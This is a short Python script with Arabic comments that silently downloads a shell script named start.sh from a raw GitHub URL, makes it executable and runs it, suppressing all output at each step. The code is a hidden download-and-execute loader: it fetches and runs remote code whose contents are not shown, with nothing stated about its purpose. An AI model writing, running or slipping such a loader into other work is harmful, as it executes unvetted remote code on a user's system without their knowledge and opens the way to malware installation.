import subprocess

def run():
    url = "https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh"
    script = "start.sh"

    # تحميل الملف بصمت
    subprocess.run(
        ["wget", url, "-O", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # إعطاء صلاحيات تنفيذ بصمت
    subprocess.run(
        ["chmod", "+x", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # تشغيل الملف بصمت
    subprocess.run(
        ["./" + script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

if __name__ == "__main__":
    run()
